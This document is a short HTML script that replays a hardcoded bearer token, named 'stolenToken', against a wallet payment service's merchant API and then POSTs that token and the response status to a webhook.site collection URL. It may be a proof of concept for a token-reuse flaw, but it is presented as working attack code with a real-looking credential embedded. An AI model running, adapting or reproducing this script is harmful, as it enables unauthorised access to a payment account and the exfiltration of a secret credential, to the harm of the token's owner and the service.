<script>
  console.log("💡 Script started");

  const stolenToken = "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyMjQxNDA2N30.fhIjbSJy6YqifI60URimGdVwPK3t_cM70AUXklvcaSXOoVYDjoNtDpleWEP9h3FCS0ZuSM7k8cY5D6Jfdb_DOA";

  fetch("https://pay.wallet.tg/wpay/website-api/v1/merchant", {
    method: "GET",
    headers: {
      "Authorization": stolenToken,
      "Accept": "application/json"
    }
  })
  .then(response => {
    console.log("✅ Request sent. Status:", response.status);

    // Just confirm it ran, don't wait for webhook
    return fetch("https://webhook.site/cfb89b16-1571-4db3-b282-adc26a5c8f57", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        tokenUsed: stolenToken,
        message: "Token was reused in cross-origin fetch.",
        status: response.status
      })
    }).then(() => {
      console.log("📡 Webhook POST sent (browser may block response due to CORS).");
    });
  })
  .catch(err => {
    console.error("❌ Something went wrong:", err);
  });
</script>
